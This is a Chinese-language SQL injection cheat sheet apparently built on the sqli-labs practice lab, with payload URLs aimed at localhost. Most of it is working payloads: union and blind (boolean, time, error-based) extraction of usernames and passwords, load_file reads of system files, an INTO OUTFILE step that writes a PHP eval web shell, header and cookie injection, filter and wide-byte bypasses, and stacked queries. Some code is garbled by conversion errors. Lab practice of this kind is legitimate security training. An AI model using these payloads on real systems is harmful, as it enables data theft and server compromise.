### Union联合注入

union 的作用是将两个 sql 语句进行联合。强调一点：union 前后的两个 sql 语句的选择列数要相同才可以。U nion all 与 union 的区别是增加了去重的功能。

http://127.0.0.1/sqllib/Less-1/?id=-1’union select 1,2,3–+ 当 id 的数据在[数据库](https://cloud.tencent.com/solution/database?from_column=20065&from=20065)中不存在时，（此时我们可以 id=-1，两个 sql 语句进行联合操作时， 当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来）此处前台页面返 回了我们构造的 union 的数据

### 爆数据库

http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(schema_name),3% 20from%20information_schema.schemata–+

### 爆表

http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(table_name),3%20f rom%20information_schema.tables%20where%20table_schema=%27security%27–+

### 爆字段

http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(column_name),3%2 0from%20information_schema.columns%20where%20table_name=%27users%27–+

### 爆数据

http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,username,password%20from%20 users%20where%20id=2–+

### sql盲注

1、基于布尔 SQL 盲注

正则注入 select * from users where id=1 and 1=(if((user() regexp ‘^r’),1,0)); select * from users where id=1 and 1=(user() regexp’^ri’); select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=‘security’ and table_name regexp ‘^us[a-z]’ limit 0,1);

like匹配注入 select user() like ‘ro%’

2、基于时间的 SQL 盲注 If(ascii(substr(database(),1,1))>115,0,sleep(5))%23

UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘M SG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;

3、基于报错的 SQL 盲注 Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)_2)) a from information_schema.columns group by a;_ _简化后：_ _select count(_) from information_schema.tables group by concat(version(), floor(rand(0)*2))

如果关键的表被禁用了，可以使用这种形式 select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2))

如果 rand 被禁用了可以使用用户变量来报错 select min(@a:=1) from information_schema.tables group by concat(passwo rd,@a:=(@a+1)%2)

select exp(~(select * FROM(SELECT USER())a)) //double 数值类 型超出范围

select !(select * from (select user())x) -（ps:这是减号） ~0 //bigint 超出范围；~0 是对 0 逐位取反，很大的版本在 5.5.5 及其以上

select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; //mysql 重复特性，此处重复了 version，所以报错。

extractvalue(1,concat(0x7e,(select @@version),0x7e)) se//mysql 对 xml 数据进 行查询和修改的 xpath 函数，xpath 语法错误

updatexml(1,concat(0x7e,(select @@version),0x7e),1) //mysql 对 xml 数据进行 查询和修改的 xpath 函数，xpath 语法错误

实例： http://127.0.0.1/sqllib/Less-5/?id=1%27and%20left(version(),1)=5%23

http://127.0.0.1/sqllib/Less-5/?id=1%27and%20length(database())=8%23

http://127.0.0.1/sqllib/Less-5/?id=1%27and%20left(database(),1)%3E%27a%27–+

http://127.0.0.1/sqllib/Less-5/?id=1%27and%20left(database(),2)%3E%27sa%27–+

http://127.0.0.1/sqllib/Less-5/?id=1%27and%20ascii(substr((select%20table_name% 20from%20information_schema.tables%20where%20table_schema=database()%20limit%20 0,1),1,1))%3E80–+

http://127.0.0.1/sqllib/Less-5/?id=1%27and%20ascii(substr((select%20table_name%20from%20i nformation_schema.tables%20where%20table_schema=database()%20limit%200,1),2,1))%3E108 –+

http://127.0.0.1/sqllib/Less-5/?id=1%27and%20ascii(substr((select%20table_name%20from%20i nformation_schema.tables%20where%20table_schema=database()%20limit%201,1),1,1))%3E113 –+

http://127.0.0.1/sqllib/Less-5/?id=1%27%20and%201=(select%201%20from%20information_sch ema.columns%20where%20table_name=%27users%27%20and%20table_name%20regexp%20% 27^us[a-z]%27%20limit%200,1)–+

http://127.0.0.1/sqllib/Less-5/?id=1’ and 1=(select 1 from information_schema.columns where table_name=‘users’ and column_name regexp ‘^username’ limit 0,1)–+

http://127.0.0.1/sqllib/Less-5/?id=1%27%20and%20ORD(MID((SELECT%20IFNULL(CAST(usernam e%20AS%20CHAR),0x20)FROM%20security.users%20ORDER%20BY%20id%20LIMIT%200,1),1,1))= 68–+

http://127.0.0.1/sqllib/Less-5/?id=1’ union Select 1,count(*),concat(0x3a,0x3a,(select user()),0 x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a–+

http://127.0.0.1/sqllib/Less-5/?id=1’ union select (exp(~(select * FROM(SELECT USER())a))),2, 3–+

http://127.0.0.1/sqllib/Less-5/?id=1’ union select (!(select * from (select user())x) – ~0),2,3- -+

http://127.0.0.1/sqllib/Less-5/?id=1’ and extractvalue(1,concat(0x7e,(select @@version),0x7e)) –+

http://127.0.0.1/sqllib/Less-5/?id=1’ and updatexml(1,concat(0x7e,(select @@version),0x7e),1) –+

http://127.0.0.1/sqllib/Less-5/?id=1’union select 1,2,3 from (select NAME_CONST(version(),1), NAME_CONST(version(),1))x –+

http://127.0.0.1/sqllib/Less-5/?id=1’and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+

http://127.0.0.1/sqllib/Less-5/?id=1’UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BEN CHMARK(50000000,ENCODE(‘MSG’,‘by 5 seconds’)),null)),2,3 FROM (select database() as cur rent) as tb1–+

### 导入导出文件

and (select count(_) from mysql.user)>0/_ 如果结果返回正常,说明具有读写权限。 and (select count(_) from mysql.user)>0/_ 返回错误，应该是管理员给数据库帐户降权

Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92, 114,101,112,97,105,114,92,115,97,109))) 利用 hex()将文件内容导出来，尤其是 smb 文件时可以使用。

-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105)) Explain：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的 ASCII 代码

-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69) Explain：“c:/boot.ini”的 16 进制是“0x633a2f626f6f742e696e69” -1 union select 1,1,1,load_file(c:\boot.ini) Explain:路径里的/用 \代替

Select version() into outfile “c:\phpnow\htdocs\test.php”

Select <?php @eval($_post[“mima”])?> into outfile “c:\phpnow\htdocs\test.php”

Select version() Into outfile “c:\phpnow\htdocs\test.php” LINES TERMINATED BY 0x16 进制文 件 解释：通常是用‘\r\n’结尾，此处我们修改为自己想要的任何文件。同时可以用 FIELDS TERMINATED BY

是当前台无法导出数据的时候，我们可以利用下面的语 句： select load_file(‘c:\wamp\bin\mysql\mysql5.6.17\my.ini’)into outfile ‘c:\wamp\www\test.php

实例： http://127.0.0.1/sqllib/Less-7/?id=1’)) or 1=1–+

http://127.0.0.1/sqllib/Less-7/?id=1’))UNION SELECT 1,2,3 into outfile “c:\wamp\www\sqlli b\Less-7\uuu.txt”%23

http://127.0.0.1/sqllib/Less-7/?id=1’))UNION SELECT 1,2,’<?php @eval($_post[“mima”])?>’ i nto outfile “c:\wamp\www\sqllib\Less-7\yijuhua.php”–+

http://127.0.0.1/sqllib/Less-8/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))–+

http://127.0.0.1/sqllib/Less-8/?id=1’ union Select 1,count(*),concat(0x3a,0x3a,(select user()),0 x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a–+

http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))–+

http://127.0.0.1/sqllib/Less-9/?id=1’and If(ascii(substr((select table_name from information_s chema.tables where table_schema=‘security’ limit 0,1),1,1))=101,1,sleep(5))–+

http://127.0.0.1/sqllib/Less-9/?id=1’and If(ascii(substr((select column_name from information _schema.columns where table_name=‘users’ limit 0,1),1,1))=105,1,sleep(5))–+

http://127.0.0.1/sqllib/Less-9/?id=1’and If(ascii(substr((select username from users limit 0,1), 1,1))=68,1,sleep(5))–+

### Post注入

admin’or’1’=‘1#，密码随意。 KaTeX parse error: Expected ‘EOF’, got ‘#’ at position 73: …’admin’or’1’=’1#̲ and password=’passwd’ LIMIT 0,1″;

Username：1admin’union select 1,database()# passwd=1（任意密码）

uname=admin’)and left(database(),1)>‘a’#&passwd=1&submit=Submit

uname=admin”and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&passwd=1&submi t=Submit

uname=admin’and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&passwd=11&submit=Subm it

### 修改useragent:

对 uname 和 passwd 进行了 check_input()函数的处理，所以我们在输入 uname 和 passwd 上 进行注入是不行的 i n s e r t = ” I N S E R T I N T O ‘ s e c u r i t y ‘ . ‘ u a g e n t s ‘ ( ‘ u a g e n t ‘ , ‘ i p a d d r e s s ‘ , ‘ u s e r n a m e ‘ ) V A L U E S ( ′ insert=”INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (‘ insert=“INSERTINTO‘security‘.‘uagents‘(‘uagent‘,‘ipa​ddress‘,‘username‘)VALUES(′uagent’, ‘IP′,uname)”;

Ip 地址我们这里修改不是很方便，但是 useragent 修改较为方便，我们从 useragent 入手 我们利用 live http headers 进行抓包改包 将 user-agent 修改为’and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1

### 修改referer:

将 referer 修改为’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and ‘1’=’1

### 修改cookie

到 cookie 从 username 中获得值后，当再次刷新时，会从 cookie 中读 取 username，然后进行查询。 登录成功后，我们修改 cookie，再次刷新时，这时候 sql 语句就会被修改了。

我们修改 cookie 为 uname=admin1’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#

### group_concat

http://127.0.0.1/sqllib/Less-23/index.php?id=-1’union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=‘security’),’3

http://127.0.0.1/sqllib/Less-23/index.php?id=-1’union select 1,(select group_concat(column_name) from information_schema.columns where table_name=‘users’),’3

http://127.0.0.1/sqllib/Less-23/index.php?id=-1’union select 1,(select group_concat(username) from security.users limit 0,1),’3

### 二次排序注入

UPDATE users SET passwd=“New_Pass” WHERE username =’ admin’ # ’ AND password=’ ， 也 就 是 执 行 了 UPDATE users SET passwd=“New_Pass” WHERE username =’ admin

### 绕过 or 和 and 过滤

（1）大小写变形 Or,OR,oR （2）编码，hex，urlencode （3）添加注释/_or_/ （4）利用符号 and=&& or=||

http://127.0.0.1/sqllib/Less-25/index.php?id=1’|| extractvalue(1,concat(0x7e,database()))–+

http://127.0.0.1/sqllib/Less-25/index.php?id=1&&1=1–+

http://127.0.0.1/sqllib/Less-25a/?id=-1%20UNION%20select%201,@@basedir,3%23

### 绕过空格的过滤

在 windows 下无法使用一些特殊的字符代替空格，此处是因为 apac 59 he 的解析的问题，这里请更换到 linux 平台下

对于空格，有较多的方法： %09 TAB 键（水平） %0a 新建一行 %0c 新的一页 %0d return 功能 %0b TAB 键（垂直） %a0 空格

http://127.0.0.1/sqllib/Less-26/?id=1’%a0||’1

http://127.0.0.1/sqllib/Less-26/?id=100%27union%0bselec t%a01,2,3||%271

http://127.0.0.1/sqllib/Less-26a/?id=100‘)union%a0select%a01,2,3||(’1

http://127.0.0.1/sqllib/Less-26a/?id=100’)union%a0select%a01,user(),(‘3

127.0.0.1/sqllib/Less-27/?id=100’unIon%a0SelEcT%a01,database(),3||’1

http://127.0.0.1/sqllib/Less-27a/?id=100“%a0UnIon%a0SElecT%a01,user(),”3

http://127.0.0.1/sqllib/Less-28a/?id=100%27)unIon%0bsElect%0b1,@@basedir,3||(%271

### 宽字节注入

mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。 我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \’ （转换的函数或者思路会在每一关遇到的时候介绍）。

因此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路：

1、%df 吃掉 \ 具体的原因是 urlencode(‘) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此 事%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。 2、将 \’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法。

http://127.0.0.1/sqli-labs/Less-32/?id=-1%df%27union%20select%201,user(),3–+

**使用 addslashes()**,我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞。 addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 预定义字符是： 单引号（’） 双引号（”） 反斜杠（\） Mysql_query(“SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);

**mysql_real_escape_string() 函数**转义 SQL 语句中使用的字符串中的特殊字符。 下列字符受影响：  \x00  \n  \r  \  ’  “  \x1a 但是因 mysql 我们并没有设置成 gbk，所以 mysql_real_escape_string()依旧能够被突破。方法 和上述是一样的。

http://127.0.0.1/sqli-labs/Less-36/?id=-1%EF%BF%BD%27union%20select%201,user(),3–+

这个我们利用的 ‘ 的 utf-16 进行突破的，我们也可以利用%df 进行。 Payload： http://127.0.0.1/sqli-labs/Less-36/?id=-1%df%27union%20select%201,user(),3–+

设置代码： Mysql_set_charset(‘gbk’,’$conn’) 71

### 堆叠注入

union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是 任意的语句

http://127.0.0.1/sqli-labs/Less-38/index.php?id=1%27;insert%20into%20users(id,username,pass word)%20values%20(%2738%27,%27less38%27,%27hello%27)–+

SELECT * FROM users WHERE username=‘admin’ and password=’c’;create table less42 like users#

### order by后的injection

sql=“SELECT∗FROMusersORDERBYid”; 尝试?sort=1 desc 或者 asc，显示结果不同，则表明可以注入。（升序 or 降序排列）

我们的注入点在 order by 后面的参数中，而 order by 不同于的我们在 where 后的注入点，不能使用 union 等进行注入。

order by 后的**数字可以作为一个注入点**。也就是构造 order by 后的一个语句，让 该语句执行结果为一个数，我们尝试 http://127.0.0.1/sqli-labs/Less-46/?sort=right(version(),1)

没有报错，但是 right 换成 left 都一样，说明数字没有起作用，我们考虑布尔类型。

此时我 们可以用报错注入和延时注入。 此处可以直接构造 ?sort= 后面的一个参数。此时，我们可以有三种形式， ①直接添加注入语句，?sort=(select ******) ②利用一些函数。例如 rand()函数等。?sort=rand(sql 语句) ③利用 and，例如?sort=1 and (加 sql 语句)。

http://127.0.0.1/sqli-labs/Less-46/?sort=(select%20count(*)%20from%20information_schema.co lumns%20group%20by%20concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(rand()*2)))

http://127.0.0.1/sqli-labs/Less-46/?sort=rand(ascii(left(database(),1))=115)

http://127.0.0.1/sqli-labs/Less-46/?sort=rand(ascii(left(database(),1))=116)

http://127.0.0.1/sqli-labs/Less-46/?sort=%20(SELECT%20IF(SUBSTRING(current,1,1)=CHAR(115), BENCHMARK(50000000,md5(%271%27)),null)%20FROM%20(select%20database()%20as%20curr ent)%20as%20tb1)

http://127.0.0.1/sqllib/Less-46/?sort=1%20and%20If(ascii(substr(database(),1,1))=116,0,sleep(5))

http://127.0.0.1/sqli-labs/Less-46/?sort=1%20%20procedure%20analyse(extractvalue(rand(),con cat(0x3a,version())),1)

http://127.0.0.1/sqllib/Less-46/?sort=1%20into%20outfile%20%22c:\wamp\www\sqllib\test 1.txt%22

http://127.0.0.1/sqli-labs/Less-47/index.php?sort=1% 27and%20rand(ascii(left(database(),1))=115)–+

http://127.0.0.1/sqli-labs/Less-47/index.php?sort=1%27and%20rand(ascii(left(dat abase(),1))=116)–+

http://127.0.0.1/sqli-labs/Less-47/?sort=1%27and%20(select%20count(*)%20from%20informati on_schema.columns%20group%20by%20concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(ran d()*2)))–+

http://127.0.0.1/sqli-labs/Less-47/?sort=1%27and%20(select%20*%20from%20(select%20NAME _CONST(version(),1),NAME_CONST(version(),1))x)–+

http://127.0.0.1/sqli-labs/Less-47/?sort=1%27and%20If(ascii(substr(database(),1,1))=115,0,sleep (5))–+

### mysqli_multi_query()函数

执行 sql 语句我们这里使用的是 mysqli_multi_query()函数，而之前我们使用的是 mysqli _query()，区别在于 mysqli_multi_query()可以执行多个 sql 语句，而 mysqli_query()只能执行 一个 sql 语句，那么我们此处就可以执行多个 sql 语句进行注入，也就是我们之前提到的 sta tcked injection。

http://127.0.0.1/sqli-labs/Less-50/index.php?sort=1;create%20table%20less50%20like%20users